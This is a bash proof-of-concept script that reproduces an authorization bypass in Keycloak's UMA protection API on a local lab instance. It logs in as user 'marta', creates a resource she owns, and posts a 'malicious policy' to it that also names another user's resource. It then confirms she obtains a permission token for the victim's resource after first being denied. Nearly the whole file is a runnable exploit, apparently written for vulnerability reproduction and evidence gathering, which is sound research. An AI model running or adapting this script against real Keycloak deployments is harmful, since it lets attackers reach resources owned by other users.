#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR=$(cd "$(dirname "$0")" && pwd)
EVIDENCE_DIR="$ROOT_DIR/evidence"

BASE_URL="http://127.0.0.1:8080"
REALM="anypoc"
TOKEN_URL="$BASE_URL/realms/$REALM/protocol/openid-connect/token"
PROTECTION_BASE="$BASE_URL/realms/$REALM/authz/protection"
CLIENT_ID="resource-server-test"
CLIENT_SECRET="secret"

mkdir -p "$EVIDENCE_DIR"

b64url_decode() {
  local value=$1
  local pad=$(( (4 - ${#value} % 4) % 4 ))
  value="${value}$(printf '=%.0s' $(seq 1 "$pad"))"
  printf '%s' "$value" | tr '_-' '/+' | base64 -d
}

save_http() {
  local prefix=$1
  shift
  local code
  code=$(curl -sS -D "$EVIDENCE_DIR/${prefix}.headers" -o "$EVIDENCE_DIR/${prefix}.body" -w '%{http_code}' "$@")
  printf '%s\n' "$code" > "$EVIDENCE_DIR/${prefix}.status"
}

timestamp=$(date -u +%Y%m%dT%H%M%SZ)
policy_name="repro-policy-$timestamp"
victim_name="REPRO Victim Resource $timestamp"
attacker_name="REPRO Marta Resource $timestamp"

/opt/keycloak-lab/scripts/keycloak_status.sh > "$EVIDENCE_DIR/keycloak_status.txt"
cat /opt/keycloak/version.txt > "$EVIDENCE_DIR/keycloak_version.txt"
cp /opt/keycloak-data/seed-info.json "$EVIDENCE_DIR/seed-info.json"

cat > "$EVIDENCE_DIR/differences.txt" <<'EOF'
Observed differences from the provided artifact set:
- The provided /poc directory contained only generation_summary.{md,json}; there was no runnable PoC script to execute verbatim.
- The pre-seeded victim resource was already grantable to marta from earlier lab state, so this reproduction used fresh per-run resources to restore a clean baseline.
EOF

save_http marta_token \
  -X POST "$TOKEN_URL" \
  --data-urlencode grant_type=password \
  --data-urlencode client_id="$CLIENT_ID" \
  --data-urlencode client_secret="$CLIENT_SECRET" \
  --data-urlencode username=marta \
  --data-urlencode password=password

MARTA_TOKEN=$(jq -r '.access_token' "$EVIDENCE_DIR/marta_token.body")
printf '%s\n' "$MARTA_TOKEN" > "$EVIDENCE_DIR/marta_access_token.jwt"
b64url_decode "$(cut -d. -f2 "$EVIDENCE_DIR/marta_access_token.jwt")" | jq '.' > "$EVIDENCE_DIR/marta_access_token.payload.json"

save_http service_token \
  -X POST "$TOKEN_URL" \
  --data-urlencode grant_type=client_credentials \
  --data-urlencode client_id="$CLIENT_ID" \
  --data-urlencode client_secret="$CLIENT_SECRET"

SERVICE_TOKEN=$(jq -r '.access_token' "$EVIDENCE_DIR/service_token.body")

jq -nc --arg name "$victim_name" '{
  name: $name,
  owner: "kolo",
  ownerManagedAccess: true,
  scopes: [{name: "Scope A"}, {name: "Scope B"}, {name: "Scope C"}]
}' > "$EVIDENCE_DIR/create_victim_resource.request.json"

save_http create_victim_resource \
  -X POST "$PROTECTION_BASE/resource_set" \
  -H "Authorization: Bearer $SERVICE_TOKEN" \
  -H 'Content-Type: application/json' \
  --data @"$EVIDENCE_DIR/create_victim_resource.request.json"

VICTIM_ID=$(jq -r '._id' "$EVIDENCE_DIR/create_victim_resource.body")

jq -nc --arg name "$attacker_name" '{
  name: $name,
  ownerManagedAccess: true,
  scopes: [{name: "Scope A"}, {name: "Scope B"}, {name: "Scope C"}]
}' > "$EVIDENCE_DIR/create_attacker_resource.request.json"

save_http create_attacker_resource \
  -X POST "$PROTECTION_BASE/resource_set" \
  -H "Authorization: Bearer $MARTA_TOKEN" \
  -H 'Content-Type: application/json' \
  --data @"$EVIDENCE_DIR/create_attacker_resource.request.json"

ATTACKER_ID=$(jq -r '._id' "$EVIDENCE_DIR/create_attacker_resource.body")

jq -nc \
  --arg attacker_id "$ATTACKER_ID" \
  --arg attacker_name "$attacker_name" \
  --arg victim_id "$VICTIM_ID" \
  --arg victim_name "$victim_name" \
  '{
    attacker: {resource_id: $attacker_id, resource_name: $attacker_name},
    victim: {resource_id: $victim_id, resource_name: $victim_name}
  }' > "$EVIDENCE_DIR/resource_map.json"

save_http attacker_lookup \
  -H "Authorization: Bearer $MARTA_TOKEN" \
  "$PROTECTION_BASE/resource_set?name=$(printf '%s' "$attacker_name" | jq -sRr @uri)"

save_http baseline_authorization \
  -X POST "$TOKEN_URL" \
  -H "Authorization: Bearer $MARTA_TOKEN" \
  --data-urlencode 'grant_type=urn:ietf:params:oauth:grant-type:uma-ticket' \
  --data-urlencode audience="$CLIENT_ID" \
  --data-urlencode "permission=${VICTIM_ID}#Scope A"

jq -nc \
  --arg name "$policy_name" \
  --arg attacker_id "$ATTACKER_ID" \
  --arg victim_id "$VICTIM_ID" \
  '{
    name: $name,
    resources: [$attacker_id, $victim_id],
    scopes: ["Scope A"],
    users: ["marta"]
  }' > "$EVIDENCE_DIR/malicious_policy.request.json"

printf '%s\n' "$PROTECTION_BASE/uma-policy/$ATTACKER_ID" > "$EVIDENCE_DIR/malicious_policy.path.txt"

save_http malicious_policy_create \
  -X POST "$PROTECTION_BASE/uma-policy/$ATTACKER_ID" \
  -H "Authorization: Bearer $MARTA_TOKEN" \
  -H 'Content-Type: application/json' \
  --data @"$EVIDENCE_DIR/malicious_policy.request.json"

save_http malicious_policy_lookup \
  -H "Authorization: Bearer $MARTA_TOKEN" \
  "$PROTECTION_BASE/uma-policy?name=$(printf '%s' "$policy_name" | jq -sRr @uri)"

save_http post_authorization \
  -X POST "$TOKEN_URL" \
  -H "Authorization: Bearer $MARTA_TOKEN" \
  --data-urlencode 'grant_type=urn:ietf:params:oauth:grant-type:uma-ticket' \
  --data-urlencode audience="$CLIENT_ID" \
  --data-urlencode "permission=${VICTIM_ID}#Scope A"

POST_TOKEN=$(jq -r '.access_token // empty' "$EVIDENCE_DIR/post_authorization.body")
if [ -n "$POST_TOKEN" ]; then
  printf '%s\n' "$POST_TOKEN" > "$EVIDENCE_DIR/post_authorization.access_token.jwt"
  b64url_decode "$(cut -d. -f2 "$EVIDENCE_DIR/post_authorization.access_token.jwt")" | jq '.' > "$EVIDENCE_DIR/post_authorization.access_token.payload.json"
fi

BASELINE_CODE=$(cat "$EVIDENCE_DIR/baseline_authorization.status")
POLICY_CODE=$(cat "$EVIDENCE_DIR/malicious_policy_create.status")
POST_CODE=$(cat "$EVIDENCE_DIR/post_authorization.status")
POST_USER=$(jq -r '.preferred_username // empty' "$EVIDENCE_DIR/post_authorization.access_token.payload.json" 2>/dev/null || true)
POST_RSID=$(jq -r '.authorization.permissions[0].rsid // empty' "$EVIDENCE_DIR/post_authorization.access_token.payload.json" 2>/dev/null || true)

if [ "$BASELINE_CODE" = "403" ] && [ "$POLICY_CODE" = "200" ] && [ "$POST_CODE" = "200" ] && [ "$POST_USER" = "marta" ] && [ "$POST_RSID" = "$VICTIM_ID" ]; then
  RESULT="succeeded"
  EXIT_CODE=0
else
  RESULT="failed"
  EXIT_CODE=1
fi

jq -nc \
  --arg result "$RESULT" \
  --arg baseline_code "$BASELINE_CODE" \
  --arg policy_code "$POLICY_CODE" \
  --arg post_code "$POST_CODE" \
  --arg post_user "$POST_USER" \
  --arg victim_id "$VICTIM_ID" \
  --arg post_rsid "$POST_RSID" \
  '{
    result: $result,
    baseline_authorization_status: $baseline_code,
    malicious_policy_create_status: $policy_code,
    post_authorization_status: $post_code,
    post_authorization_user: $post_user,
    expected_victim_resource_id: $victim_id,
    post_authorization_resource_id: $post_rsid
  }' > "$EVIDENCE_DIR/summary.json"

cat > "$EVIDENCE_DIR/summary.txt" <<EOF
result=$RESULT
baseline_authorization_status=$BASELINE_CODE
malicious_policy_create_status=$POLICY_CODE
post_authorization_status=$POST_CODE
post_authorization_user=$POST_USER
expected_victim_resource_id=$VICTIM_ID
post_authorization_resource_id=$POST_RSID
EOF

exit "$EXIT_CODE"
